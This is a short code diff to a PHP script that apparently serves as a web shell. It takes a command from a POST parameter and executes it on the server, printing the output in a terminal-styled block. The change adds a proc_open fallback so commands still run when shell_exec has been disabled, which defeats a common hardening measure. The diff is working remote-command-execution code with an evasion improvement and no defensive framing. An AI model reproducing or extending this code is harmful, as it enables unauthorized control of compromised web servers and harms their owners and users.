@@ -42,7 +42,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         if($action=='command' && isset($_POST['cmd'])){
             $cmd_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
             if (is_dir($cmd_path)) { chdir($cmd_path); }
-            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}else{$output="Server function disabled!";}
+            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}elseif (function_exists('proc_open')) {
+            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($_POST['cmd'],$d,$pipes);
+            if (is_resource($p)) {
+                fclose($pipes[0]);
+                $output = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
+                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
+            }else{$output="proc_open failed!";}}else{$output="Server function disabled!";}
             echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
             exit;
         }
